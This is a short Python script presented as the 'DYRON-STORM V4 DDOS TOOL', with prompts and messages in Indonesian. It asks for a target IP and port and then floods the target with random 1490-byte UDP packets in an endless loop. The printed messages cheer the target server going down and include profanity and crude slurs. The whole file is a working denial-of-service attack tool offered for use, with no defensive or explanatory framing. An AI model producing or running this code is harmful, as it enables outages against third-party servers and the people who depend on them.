import socket
import random
import os
import sys

def attack():
    os.system("clear")
    print("====================================")
    print("      DYRON-STORM V4 DDOS TOOL      ")
    print("      BY: INTELIJEN HYPER JOMOK     ")
    print("====================================")
    
    ip = input("MASUKIN IP TARGET: ")
    port = int(input("MASUKIN PORT (80/443): "))
    packet = int(input("KECEPATAN (REKOMENDASI: 1000): "))

    # PEMBUATAN PAYLOAD SAMPAH
    bytes = random._urandom(1490)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print(f"\n[+] MENGIRIM SERANGAN KE {ip} PADA PORT {port}...")
    sent = 0
    while True:
        try:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print(f"[!] MENGIRIM {sent} PACKET KE {ip} (BRUTAL MODE ON)")
            if sent == packet * 100:
                print("[*] SERVER TARGET MULAI KEJANG-KEJANG, K*NTOL!")
        except KeyboardInterrupt:
            print("\n[!] SERANGAN DIHENTIKAN OLEH MASTER!")
            sys.exit()
        except:
            print("\n[X] SERVER SUDAH MODAR/DOWN, BABI!")
            break

attack()
